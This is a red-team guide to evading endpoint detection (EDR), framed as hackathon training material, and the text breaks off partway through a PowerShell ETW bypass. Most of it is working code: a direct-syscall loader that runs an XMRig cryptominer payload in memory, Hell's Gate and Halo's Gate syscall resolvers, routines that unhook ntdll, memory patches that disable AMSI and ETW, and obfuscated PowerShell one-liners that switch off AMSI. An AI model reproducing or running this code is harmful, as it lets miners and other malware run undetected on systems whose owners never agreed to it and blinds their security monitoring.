# EDR Bypass Techniques - Advanced Evasion Guide

**OSCP Hackathon 2025 - EDR Evasion Educational Documentation**

**Purpose**: Comprehensive guide to understanding and bypassing modern EDR solutions for defensive security training.

**Classification**: Educational - Red Team Training Material

---

## Table of Contents

1. [Understanding Modern EDR Architecture](#understanding-modern-edr-architecture)
2. [Direct Syscall Implementation](#direct-syscall-implementation)
3. [API Hook Detection & Removal](#api-hook-detection--removal)
4. [AMSI Bypass Techniques](#amsi-bypass-techniques)
5. [ETW Evasion Methods](#etw-evasion-methods)
6. [Kernel Callback Evasion](#kernel-callback-evasion)
7. [Thread Stack Spoofing](#thread-stack-spoofing)
8. [Process Manipulation](#process-manipulation)
9. [Complete Evasion Framework](#complete-evasion-framework)
10. [Blue Team Detection Strategies](#blue-team-detection-strategies)

---

## Understanding Modern EDR Architecture

### The EDR Security Stack

```
┌─────────────────────────────────────────────────┐
│           Application Layer                      │  ← Your XMRig
├─────────────────────────────────────────────────┤
│           User-Mode Hooks (Inline)              │  ← EDR patches APIs
├─────────────────────────────────────────────────┤
│           AMSI (Anti-Malware Scan Interface)    │  ← Script scanning
├─────────────────────────────────────────────────┤
│           ETW (Event Tracing for Windows)       │  ← Telemetry collection
├─────────────────────────────────────────────────┤
│           Minifilter Drivers                     │  ← File system monitoring
├─────────────────────────────────────────────────┤
│           Kernel Callbacks                       │  ← Process/Thread/Image load
├─────────────────────────────────────────────────┤
│           Hypervisor (VBS)                       │  ← Some EDRs live here
└─────────────────────────────────────────────────┘
```

### How EDR Detects XMRig

**1. Signature-Based Detection**
- Binary hash matching
- String pattern recognition
- YARA rules for known miners

**2. Behavioral Detection**
- High CPU usage patterns
- Network connections to mining pools
- Memory allocation patterns (RWX regions)
- Suspicious API call sequences

**3. Heuristic Detection**
- Process injection indicators
- Modified system DLLs
- Unbacked executable memory
- Anomalous parent-child relationships

**4. Telemetry-Based Detection**
- ETW event correlation
- Process tree analysis
- Network traffic patterns
- Command-line arguments

### EDR Bypass Strategy

**Layer Defense Approach**:
1. **Pre-Execution**: Sandbox detection, environmental keying
2. **Execution Time**: Disable hooks, patch AMSI/ETW
3. **Runtime**: Use direct syscalls, avoid detection patterns
4. **Post-Execution**: Clean up artifacts, maintain stealth

---

## Direct Syscall Implementation

### Why Direct Syscalls?

**The Problem**: EDR products hook user-mode APIs in ntdll.dll and kernel32.dll to monitor malicious activity.

**Example of Hooked API**:
```
Normal VirtualAlloc:
  mov r10, rcx          ← Normal prologue
  mov eax, 0x18         ← Syscall number
  syscall               ← Kernel transition
  ret

Hooked VirtualAlloc:
  jmp 0x7FFE12340000   ← Jump to EDR hook! ❌
  [EDR inspection code]
  [Original function if allowed]
```

**The Solution**: Call the kernel directly, bypassing userland hooks entirely.

### Basic Direct Syscall Implementation

**Assembly Stub**:

```asm
; syscall_stub.asm - x64 Windows
; Compile: nasm -f win64 syscall_stub.asm

section .text
global NtAllocateVirtualMemory
global NtProtectVirtualMemory
global NtCreateThreadEx

NtAllocateVirtualMemory:
    mov r10, rcx              ; Save RCX (Windows syscall convention)
    mov eax, 0x18             ; Syscall number for NtAllocateVirtualMemory
    syscall                   ; Transition to kernel
    ret

NtProtectVirtualMemory:
    mov r10, rcx
    mov eax, 0x50             ; Syscall number for NtProtectVirtualMemory
    syscall
    ret

NtCreateThreadEx:
    mov r10, rcx
    mov eax, 0xC1             ; Syscall number for NtCreateThreadEx
    syscall
    ret
```

**C Wrapper**:

```c
// syscalls.c - Direct syscall implementation
#include <windows.h>
#include <stdio.h>

// Forward declarations from assembly
extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

extern NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// XMRig loader using direct syscalls
BOOL LoadXMRigDirect(BYTE* xmrig_data, SIZE_T xmrig_size)
{
    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddress = NULL;
    SIZE_T regionSize = xmrig_size;
    NTSTATUS status;

    printf("[*] Allocating memory via direct syscall...\n");

    // Direct syscall - bypasses EDR hooks!
    status = NtAllocateVirtualMemory(
        hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        printf("[-] Allocation failed: 0x%X\n", status);
        return FALSE;
    }

    printf("[+] Allocated at: 0x%p\n", baseAddress);
    printf("[*] Copying XMRig payload...\n");

    // Copy XMRig to allocated memory
    memcpy(baseAddress, xmrig_data, xmrig_size);

    printf("[*] Changing protection to RX via direct syscall...\n");

    // Change protection to RX (not RWX to avoid detection)
    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    if (status != 0) {
        printf("[-] Protection change failed: 0x%X\n", status);
        return FALSE;
    }

    printf("[*] Creating thread via direct syscall...\n");

    // Create thread with direct syscall
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        baseAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("[-] Thread creation failed: 0x%X\n", status);
        return FALSE;
    }

    printf("[+] Thread created: 0x%p\n", hThread);
    printf("[+] XMRig loaded successfully via direct syscalls!\n");

    return TRUE;
}
```

**Compilation**:
```bash
# Assemble syscall stubs
nasm -f win64 syscall_stub.asm -o syscall_stub.obj

# Compile C code
gcc -c syscalls.c -o syscalls.obj

# Link
gcc syscall_stub.obj syscalls.obj -o xmrig_loader.exe
```

### Hell's Gate Technique

**Purpose**: Dynamically resolve syscall numbers to avoid hardcoding (which breaks across Windows versions).

**Implementation**:

```c
// hells_gate.c - Dynamic syscall resolution
#include <windows.h>
#include <stdio.h>

typedef struct _SYSCALL_ENTRY {
    WORD syscall_number;
    PVOID function_address;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

/**
 * Hell's Gate: Extract syscall number from ntdll function
 *
 * How it works:
 * 1. Locate function in ntdll.dll
 * 2. Check if function is hooked
 * 3. If clean, extract SSN from prologue
 * 4. If hooked, search neighbors for clean stub
 */
DWORD HellsGate_GetSSN(LPCSTR function_name)
{
    BYTE* ntdll = (BYTE*)GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get ntdll handle\n");
        return -1;
    }

    FARPROC pFunction = GetProcAddress((HMODULE)ntdll, function_name);
    if (!pFunction) {
        printf("[-] Failed to find %s\n", function_name);
        return -1;
    }

    printf("[*] %s at 0x%p\n", function_name, pFunction);

    // Check first byte for hook
    BYTE* functionBytes = (BYTE*)pFunction;

    // Expected clean syscall stub pattern:
    // 4C 8B D1    mov r10, rcx
    // B8 XX XX XX XX    mov eax, SSN
    // 0F 05    syscall
    // C3    ret

    // Check if hooked (common hook patterns)
    if (functionBytes[0] == 0xE9) {  // JMP rel32 (inline hook)
        printf("[!] Function is hooked (JMP detected)\n");

        // Search neighbors for clean syscall
        for (int i = 1; i < 500; i++) {
            // Check function above
            BYTE* above = functionBytes - (i * 0x20);  // Typical function size
            if (above[0] == 0x4C && above[1] == 0x8B && above[2] == 0xD1) {
                // Found clean stub, calculate SSN
                DWORD clean_ssn = *(DWORD*)(above + 4);
                printf("[+] Found clean stub %d functions above (SSN: 0x%X)\n", i, clean_ssn);
                return clean_ssn + i;
            }

            // Check function below
            BYTE* below = functionBytes + (i * 0x20);
            if (below[0] == 0x4C && below[1] == 0x8B && below[2] == 0xD1) {
                DWORD clean_ssn = *(DWORD*)(below + 4);
                printf("[+] Found clean stub %d functions below (SSN: 0x%X)\n", i, clean_ssn);
                return clean_ssn - i;
            }
        }

        printf("[-] Could not find clean syscall stub\n");
        return -1;
    }

    // Check if FF 25 (JMP [RIP+offset] - trampoline hook)
    if (functionBytes[0] == 0xFF && functionBytes[1] == 0x25) {
        printf("[!] Function is hooked (trampoline detected)\n");
        return -1;
    }

    // Function appears clean, extract SSN
    if (functionBytes[0] == 0x4C && functionBytes[1] == 0x8B && functionBytes[2] == 0xD1) {
        // mov r10, rcx - expected
        if (functionBytes[3] == 0xB8) {
            // mov eax, SSN
            DWORD ssn = *(DWORD*)(functionBytes + 4);
            printf("[+] Clean function, SSN: 0x%X\n", ssn);
            return ssn;
        }
    }

    printf("[-] Unexpected function prologue\n");
    return -1;
}

/**
 * Execute syscall with resolved SSN
 */
NTSTATUS ExecuteSyscall(DWORD ssn, PVOID arg1, PVOID arg2, PVOID arg3,
                        PVOID arg4, PVOID arg5, PVOID arg6)
{
    NTSTATUS status;

    // Inline assembly for syscall
    __asm__ volatile(
        "mov r10, rcx\n"           // Save RCX (first arg)
        "mov eax, %1\n"            // Load SSN
        "syscall\n"                // Execute syscall
        "mov %0, eax\n"            // Save return value
        : "=r" (status)
        : "r" (ssn)
        : "rax", "r10", "r11", "memory"
    );

    return status;
}

// Example usage
int main()
{
    printf("[*] Hell's Gate - Dynamic Syscall Resolution\n\n");

    // Resolve NtAllocateVirtualMemory
    DWORD ssn_alloc = HellsGate_GetSSN("NtAllocateVirtualMemory");
    if (ssn_alloc == -1) {
        printf("[-] Failed to resolve NtAllocateVirtualMemory\n");
        return 1;
    }

    // Resolve NtProtectVirtualMemory
    DWORD ssn_protect = HellsGate_GetSSN("NtProtectVirtualMemory");
    if (ssn_protect == -1) {
        printf("[-] Failed to resolve NtProtectVirtualMemory\n");
        return 1;
    }

    // Resolve NtCreateThreadEx
    DWORD ssn_thread = HellsGate_GetSSN("NtCreateThreadEx");
    if (ssn_thread == -1) {
        printf("[-] Failed to resolve NtCreateThreadEx\n");
        return 1;
    }

    printf("\n[+] All syscalls resolved successfully!\n");
    printf("[+] Ready to execute with dynamic SSNs\n");

    // Now use ExecuteSyscall() with resolved SSNs

    return 0;
}
```

### Halo's Gate Technique

**Enhancement over Hell's Gate**: Better handling of hooked functions by checking neighboring syscalls.

```c
// halos_gate.c - Enhanced syscall resolution
#include <windows.h>
#include <stdio.h>

/**
 * Halo's Gate: Enhanced Hell's Gate with better neighbor search
 *
 * Improvements:
 * - Smarter neighbor detection
 * - Handles partial hooks
 * - More reliable SSN calculation
 */
DWORD HalosGate_GetSSN(LPCSTR function_name)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunction = GetProcAddress(ntdll, function_name);

    if (!pFunction) return -1;

    BYTE* functionBytes = (BYTE*)pFunction;

    // Check if clean
    if (functionBytes[0] == 0x4C && functionBytes[1] == 0x8B && functionBytes[2] == 0xD1) {
        if (functionBytes[3] == 0xB8) {
            return *(DWORD*)(functionBytes + 4);
        }
    }

    // Function is hooked, search in both directions
    printf("[!] %s is hooked, searching neighbors...\n", function_name);

    int halo_distance = 1;
    while (halo_distance < 500) {
        // Check above
        BYTE* above = functionBytes - (halo_distance * 0x20);

        // Validate address is readable
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(above, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READ) {
                if (above[0] == 0x4C && above[1] == 0x8B && above[2] == 0xD1) {
                    if (above[3] == 0xB8) {
                        DWORD base_ssn = *(DWORD*)(above + 4);
                        printf("[+] Found clean stub above, calculating SSN\n");
                        return base_ssn + halo_distance;
                    }
                }
            }
        }

        // Check below
        BYTE* below = functionBytes + (halo_distance * 0x20);

        if (VirtualQuery(below, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_EXECUTE_READ) {
                if (below[0] == 0x4C && below[1] == 0x8B && below[2] == 0xD1) {
                    if (below[3] == 0xB8) {
                        DWORD base_ssn = *(DWORD*)(below + 4);
                        printf("[+] Found clean stub below, calculating SSN\n");
                        return base_ssn - halo_distance;
                    }
                }
            }
        }

        halo_distance++;
    }

    printf("[-] Could not find clean syscall stub\n");
    return -1;
}

/**
 * Automated SSN table builder
 */
typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtWriteVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtOpenProcess;
    DWORD NtClose;
    DWORD NtWaitForSingleObject;
} SYSCALL_TABLE;

BOOL BuildSyscallTable(SYSCALL_TABLE* table)
{
    printf("[*] Building syscall table with Halo's Gate...\n");

    table->NtAllocateVirtualMemory = HalosGate_GetSSN("NtAllocateVirtualMemory");
    table->NtProtectVirtualMemory = HalosGate_GetSSN("NtProtectVirtualMemory");
    table->NtCreateThreadEx = HalosGate_GetSSN("NtCreateThreadEx");
    table->NtWriteVirtualMemory = HalosGate_GetSSN("NtWriteVirtualMemory");
    table->NtReadVirtualMemory = HalosGate_GetSSN("NtReadVirtualMemory");
    table->NtOpenProcess = HalosGate_GetSSN("NtOpenProcess");
    table->NtClose = HalosGate_GetSSN("NtClose");
    table->NtWaitForSingleObject = HalosGate_GetSSN("NtWaitForSingleObject");

    // Verify all resolved
    if (table->NtAllocateVirtualMemory == -1 ||
        table->NtProtectVirtualMemory == -1 ||
        table->NtCreateThreadEx == -1) {
        printf("[-] Failed to build complete syscall table\n");
        return FALSE;
    }

    printf("[+] Syscall table built successfully!\n");
    printf("    NtAllocateVirtualMemory: 0x%X\n", table->NtAllocateVirtualMemory);
    printf("    NtProtectVirtualMemory:  0x%X\n", table->NtProtectVirtualMemory);
    printf("    NtCreateThreadEx:        0x%X\n", table->NtCreateThreadEx);

    return TRUE;
}
```

---

## API Hook Detection & Removal

### Understanding API Hooks

**Inline Hook Example**:
```
Original Function:
  0x7FFE0000: 4C 8B D1          mov r10, rcx
  0x7FFE0003: B8 18 00 00 00    mov eax, 0x18
  0x7FFE0008: 0F 05             syscall
  0x7FFE000A: C3                ret

Hooked Function:
  0x7FFE0000: E9 XX XX XX XX    jmp [EDR_Handler]  ← 5-byte hook
  0x7FFE0005: 00 00 00 00       [overwritten bytes]
  0x7FFE0008: [rest of original]
```

### Hook Detection Implementation

```c
// hook_detector.c - Detect API hooks
#include <windows.h>
#include <stdio.h>

typedef enum _HOOK_TYPE {
    HOOK_NONE,
    HOOK_INLINE_JMP,        // E9 XX XX XX XX (jmp rel32)
    HOOK_INLINE_PUSH_RET,   // 68 XX XX XX XX C3 (push addr; ret)
    HOOK_TRAMPOLINE,        // FF 25 XX XX XX XX (jmp [rip+offset])
    HOOK_IAT,               // Import Address Table hook
    HOOK_UNKNOWN
} HOOK_TYPE;

typedef struct _HOOK_INFO {
    LPCSTR function_name;
    PVOID function_address;
    HOOK_TYPE hook_type;
    PVOID hook_target;
    BOOL is_hooked;
} HOOK_INFO;

/**
 * Check if a function is hooked
 */
BOOL IsAPIHooked(LPCSTR dll_name, LPCSTR function_name, HOOK_INFO* info)
{
    HMODULE hModule = GetModuleHandleA(dll_name);
    if (!hModule) {
        hModule = LoadLibraryA(dll_name);
        if (!hModule) return FALSE;
    }

    FARPROC pFunction = GetProcAddress(hModule, function_name);
    if (!pFunction) return FALSE;

    info->function_name = function_name;
    info->function_address = pFunction;
    info->is_hooked = FALSE;
    info->hook_type = HOOK_NONE;
    info->hook_target = NULL;

    BYTE* functionBytes = (BYTE*)pFunction;

    // Check for inline JMP hook (E9 XX XX XX XX)
    if (functionBytes[0] == 0xE9) {
        info->is_hooked = TRUE;
        info->hook_type = HOOK_INLINE_JMP;

        // Calculate jump target
        INT32 offset = *(INT32*)(functionBytes + 1);
        info->hook_target = (PVOID)(functionBytes + 5 + offset);

        return TRUE;
    }

    // Check for trampoline hook (FF 25 XX XX XX XX)
    if (functionBytes[0] == 0xFF && functionBytes[1] == 0x25) {
        info->is_hooked = TRUE;
        info->hook_type = HOOK_TRAMPOLINE;

        // Calculate RIP-relative address
        INT32 offset = *(INT32*)(functionBytes + 2);
        PVOID* pTarget = (PVOID*)(functionBytes + 6 + offset);
        info->hook_target = *pTarget;

        return TRUE;
    }

    // Check for PUSH/RET hook (68 XX XX XX XX C3)
    if (functionBytes[0] == 0x68 && functionBytes[5] == 0xC3) {
        info->is_hooked = TRUE;
        info->hook_type = HOOK_INLINE_PUSH_RET;
        info->hook_target = *(PVOID*)(functionBytes + 1);
        return TRUE;
    }

    // Check for unusual NOP sled (suspicious at function start)
    int nop_count = 0;
    for (int i = 0; i < 10; i++) {
        if (functionBytes[i] == 0x90) nop_count++;
    }
    if (nop_count > 5) {
        info->is_hooked = TRUE;
        info->hook_type = HOOK_UNKNOWN;
        return TRUE;
    }

    return FALSE;
}

/**
 * Scan multiple functions for hooks
 */
void ScanForHooks()
{
    printf("[*] Scanning for API hooks...\n\n");

    struct {
        LPCSTR dll;
        LPCSTR function;
    } functions_to_check[] = {
        {"ntdll.dll", "NtAllocateVirtualMemory"},
        {"ntdll.dll", "NtProtectVirtualMemory"},
        {"ntdll.dll", "NtCreateThreadEx"},
        {"ntdll.dll", "NtWriteVirtualMemory"},
        {"ntdll.dll", "NtReadVirtualMemory"},
        {"ntdll.dll", "NtOpenProcess"},
        {"kernel32.dll", "CreateProcessA"},
        {"kernel32.dll", "CreateProcessW"},
        {"kernel32.dll", "VirtualAlloc"},
        {"kernel32.dll", "VirtualProtect"},
        {"kernel32.dll", "CreateRemoteThread"},
        {NULL, NULL}
    };

    int hooked_count = 0;
    int total_count = 0;

    for (int i = 0; functions_to_check[i].dll != NULL; i++) {
        HOOK_INFO info = {0};
        total_count++;

        if (IsAPIHooked(functions_to_check[i].dll, functions_to_check[i].function, &info)) {
            hooked_count++;
            printf("[!] HOOKED: %s!%s\n", functions_to_check[i].dll, functions_to_check[i].function);
            printf("    Address: 0x%p\n", info.function_address);
            printf("    Type: ");

            switch (info.hook_type) {
                case HOOK_INLINE_JMP:
                    printf("Inline JMP (E9)\n");
                    break;
                case HOOK_TRAMPOLINE:
                    printf("Trampoline (FF 25)\n");
                    break;
                case HOOK_INLINE_PUSH_RET:
                    printf("PUSH/RET\n");
                    break;
                default:
                    printf("Unknown\n");
            }

            if (info.hook_target) {
                printf("    Target: 0x%p\n", info.hook_target);
            }
            printf("\n");
        } else {
            printf("[+] Clean: %s!%s\n", functions_to_check[i].dll, functions_to_check[i].function);
        }
    }

    printf("\n[*] Scan complete: %d/%d functions hooked\n", hooked_count, total_count);
}
```

### Hook Removal (Unhooking)

```c
// unhook.c - Remove API hooks
#include <windows.h>
#include <stdio.h>

/**
 * Restore original bytes from ntdll.dll on disk
 */
BOOL UnhookNtdll()
{
    printf("[*] Attempting to unhook ntdll.dll...\n");

    // Get ntdll base address in memory
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    printf("[+] ntdll.dll loaded at: 0x%p\n", hNtdll);

    // Find ntdll.dll on disk
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat_s(ntdllPath, MAX_PATH, "\\\\ntdll.dll");

    printf("[*] Reading clean ntdll from: %s\n", ntdllPath);

    // Open file
    HANDLE hFile = CreateFileA(
        ntdllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open ntdll.dll\n");
        return FALSE;
    }

    // Get file size
    DWORD fileSize = GetFileSize(hFile, NULL);
    printf("[+] File size: %d bytes\n", fileSize);

    // Allocate buffer
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        return FALSE;
    }

    // Read file
    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL)) {
        printf("[-] Failed to read file\n");
        free(fileBuffer);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    printf("[+] Read %d bytes from disk\n", bytesRead);

    // Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);

    // Find .text section
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    PIMAGE_SECTION_HEADER textSection = NULL;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            textSection = &sectionHeader[i];
            break;
        }
    }

    if (!textSection) {
        printf("[-] .text section not found\n");
        free(fileBuffer);
        return FALSE;
    }

    printf("[+] Found .text section\n");
    printf("    Virtual Address: 0x%X\n", textSection->VirtualAddress);
    printf("    Size: 0x%X\n", textSection->SizeOfRawData);

    // Calculate addresses
    BYTE* diskTextSection = fileBuffer + textSection->PointerToRawData;
    BYTE* memoryTextSection = (BYTE*)hNtdll + textSection->VirtualAddress;

    printf("[*] Restoring .text section...\n");

    // Make memory writable
    DWORD oldProtect;
    if (!VirtualProtect(
        memoryTextSection,
        textSection->SizeOfRawData,
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    )) {
        printf("[-] VirtualProtect failed\n");
        free(fileBuffer);
        return FALSE;
    }

    // Copy clean .text section from disk to memory
    memcpy(memoryTextSection, diskTextSection, textSection->SizeOfRawData);

    // Restore protection
    VirtualProtect(
        memoryTextSection,
        textSection->SizeOfRawData,
        oldProtect,
        &oldProtect
    );

    free(fileBuffer);

    printf("[+] ntdll.dll unhooked successfully!\n");
    printf("[+] All hooks removed from .text section\n");

    return TRUE;
}

/**
 * Unhook specific function by restoring original bytes
 */
BOOL UnhookFunction(LPCSTR dll_name, LPCSTR function_name)
{
    printf("[*] Unhooking %s!%s...\n", dll_name, function_name);

    // Get function address in memory
    HMODULE hModule = GetModuleHandleA(dll_name);
    FARPROC pFunction = GetProcAddress(hModule, function_name);

    if (!pFunction) {
        printf("[-] Function not found\n");
        return FALSE;
    }

    // Read clean bytes from disk (simplified - use full PE parsing)
    // For now, assume we know the clean bytes

    // Example: Restore NtAllocateVirtualMemory
    if (strcmp(function_name, "NtAllocateVirtualMemory") == 0) {
        BYTE cleanBytes[] = {
            0x4C, 0x8B, 0xD1,           // mov r10, rcx
            0xB8, 0x18, 0x00, 0x00, 0x00,  // mov eax, 0x18
            0x0F, 0x05,                 // syscall
            0xC3                        // ret
        };

        DWORD oldProtect;
        VirtualProtect(pFunction, sizeof(cleanBytes), PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy(pFunction, cleanBytes, sizeof(cleanBytes));
        VirtualProtect(pFunction, sizeof(cleanBytes), oldProtect, &oldProtect);

        printf("[+] Function unhooked\n");
        return TRUE;
    }

    return FALSE;
}
```

---

## AMSI Bypass Techniques

### Understanding AMSI

**AMSI Architecture**:
```
PowerShell Script
       ↓
   [AMSI Scan Request]
       ↓
   amsi.dll (AmsiScanBuffer)
       ↓
   Windows Defender (or other AV)
       ↓
   [Clean / Malicious verdict]
       ↓
   Allow / Block execution
```

### Method 1: Memory Patching

```c
// amsi_bypass.c - Patch AmsiScanBuffer in memory
#include <windows.h>
#include <stdio.h>

BOOL BypassAMSI_MemoryPatch()
{
    printf("[*] Attempting AMSI bypass via memory patching...\n");

    // Load amsi.dll
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        printf("[-] AMSI not loaded\n");
        return TRUE;  // Not present = success
    }

    printf("[+] amsi.dll loaded at: 0x%p\n", hAmsi);

    // Get AmsiScanBuffer address
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        printf("[-] AmsiScanBuffer not found\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer at: 0x%p\n", pAmsiScanBuffer);

    // Patch bytes: mov eax, 0x80070057; ret
    // This makes AMSI always return E_INVALIDARG (clean result)
    BYTE patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
        0xC3                            // ret
    };

    printf("[*] Applying patch...\n");

    // Make memory writable
    DWORD oldProtect;
    if (!VirtualProtect(
        pAmsiScanBuffer,
        sizeof(patch),
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    )) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    // Apply patch
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));

    // Restore protection (optional, but more stealthy)
    VirtualProtect(
        pAmsiScanBuffer,
        sizeof(patch),
        oldProtect,
        &oldProtect
    );

    printf("[+] AMSI bypassed successfully!\n");

    return TRUE;
}
```

### Method 2: Force AMSI Initialization Failure

```c
// Force amsiInitFailed to true
BOOL BypassAMSI_InitFailed()
{
    printf("[*] Attempting AMSI bypass via init failure...\n");

    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE;

    FARPROC pAmsiInitialize = GetProcAddress(hAmsi, "AmsiInitialize");
    if (!pAmsiInitialize) return FALSE;

    // Corrupt AmsiInitialize to always fail
    BYTE patch[] = { 0xC3 };  // ret (immediate return)

    DWORD oldProtect;
    VirtualProtect(pAmsiInitialize, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAmsiInitialize, patch, sizeof(patch));
    VirtualProtect(pAmsiInitialize, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] AMSI initialization disabled\n");

    return TRUE;
}
```

### Method 3: PowerShell Reflection Bypass

```powershell
# amsi_bypass.ps1 - Multiple AMSI bypass methods

# Method 1: Reflection - Set amsiInitFailed to true
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Obfuscated reflection
$a = 'si'
$b = 'Am'
$c = 'Utils'
$d = [Ref].Assembly.GetType("System.Management.Automation.$b$a$c")
$e = 'amsi'
$f = 'Init'
$g = 'Failed'
$d.GetField("$e$f$g",'NonPublic,Static').SetValue($null,$true)

# Method 3: Force error in AmsiContext
$a = [Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null,$a)

# Method 4: Null out AmsiSession
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null)

# Verify AMSI is disabled
Write-Host "[+] AMSI should be disabled"
Write-Host "[*] Testing with AMSI test string..."

# This should execute without AMSI blocking
$AmsiTestString = 'Invoke-Mimikatz'
Write-Host "[+] Test passed: $AmsiTestString"
```

---

## ETW Evasion Methods

### Understanding ETW

**ETW (Event Tracing for Windows)** collects telemetry that EDR uses for behavioral detection.

**ETW Flow**:
```
Application
   ↓
EtwEventWrite()
   ↓
[ETW Provider]
   ↓
[Trace Session]
   ↓
EDR Console
```

### Method 1: Patch EtwEventWrite

```c
// etw_bypass.c - Disable ETW telemetry
#include <windows.h>
#include <stdio.h>

BOOL BypassETW_PatchEventWrite()
{
    printf("[*] Attempting ETW bypass via EtwEventWrite patch...\n");

    // Get ntdll handle
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    // Get EtwEventWrite address
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] EtwEventWrite not found\n");
        return FALSE;
    }

    printf("[+] EtwEventWrite at: 0x%p\n", pEtwEventWrite);

    // Patch: ret 14h (return immediately with stack cleanup)
    BYTE patch[] = { 0xC2, 0x14, 0x00 };

    printf("[*] Applying patch...\n");

    // Make writable
    DWORD oldProtect;
    if (!VirtualProtect(
        pEtwEventWrite,
        sizeof(patch),
        PAGE_EXECUTE_READWRITE,
        &oldProtect
    )) {
        printf("[-] VirtualProtect failed\n");
        return FALSE;
    }

    // Apply patch
    memcpy(pEtwEventWrite, patch, sizeof(patch));

    // Restore protection
    VirtualProtect(
        pEtwEventWrite,
        sizeof(patch),
        oldProtect,
        &oldProtect
    );

    printf("[+] ETW bypassed successfully!\n");
    printf("[+] No telemetry will be sent to EDR\n");

    return TRUE;
}

// Alternative: Patch EtwEventRegister
BOOL BypassETW_PatchEventRegister()
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtwEventRegister = GetProcAddress(hNtdll, "EtwEventRegister");

    if (!pEtwEventRegister) return FALSE;

    // xor rax, rax; ret (return 0 = success, but doesn't register)
    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };

    DWORD oldProtect;
    VirtualProtect(pEtwEventRegister, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pEtwEventRegister, patch, sizeof(patch));
    VirtualProtect(pEtwEventRegister, sizeof(patch), oldProtect, &oldProtect);

    printf("[+] EtwEventRegister patched\n");

    return TRUE;
}
```

### Method 2: PowerShell ETW Bypass

```powershell
# etw_bypass.ps1

# Method 1: Patch EtwEventWrite
$EtwPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
